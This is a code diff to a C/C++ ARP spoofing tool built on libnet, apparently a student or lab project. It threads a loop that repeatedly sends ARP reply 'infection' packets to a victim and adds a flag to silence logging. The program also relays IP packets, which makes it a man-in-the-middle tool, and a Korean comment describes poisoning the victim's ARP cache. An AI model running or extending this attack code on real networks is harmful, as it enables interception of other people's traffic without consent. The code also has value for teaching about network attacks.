@@ -1,8 +1,9 @@
 #include <stdio.h>
 #include <libnet.h>
+#include <thread>
 
 void send_arp_packet();
-void send_arp_reply_infection_packet();
+void send_arp_reply_infection_packet(bool printLog);
 void send_arp_reply_infection_packet_loop();
 void relay_ip_packet();
 void recover_victim_arp_table();
@@ -43,10 +44,10 @@ int main() {
             send_arp_packet();
             break;
         case 2:
-            send_arp_reply_infection_packet();
+            send_arp_reply_infection_packet(true);
             break;
         case 3:
-            send_arp_reply_infection_packet_loop();
+            std::thread(send_arp_reply_infection_packet_loop).detach();
             break;
         case 4:
             relay_ip_packet();
@@ -140,7 +141,7 @@ void send_arp_packet() {
     수신할 수 있도록 ARP Reply infection packet을 만들어 Attacker가 Victim에게 전송.
     이후 Victim에서 ARP cache의 내용이 변경되면 성공.
 */
-void send_arp_reply_infection_packet() {
+void send_arp_reply_infection_packet(bool printLog) {
     int _t;
     char *device = (char*) dev;
     in_addr_t destaddr = inet_addr(victim_ip);
@@ -193,7 +194,9 @@ void send_arp_reply_infection_packet() {
         exit(1);
     }
 
-    printf("ARP response packet was successfully sended.\n");
+    if (printLog) {
+        printf("ARP response packet was successfully sended.\n");
+    }
 
     /* exit cleanly */
     libnet_destroy(l);
@@ -206,7 +209,7 @@ void send_arp_reply_infection_packet() {
 */
 void send_arp_reply_infection_packet_loop() {
     while(true) {
-        send_arp_reply_infection_packet();
+        send_arp_reply_infection_packet(false);
         sleep(attack_cycle);
     }
 }
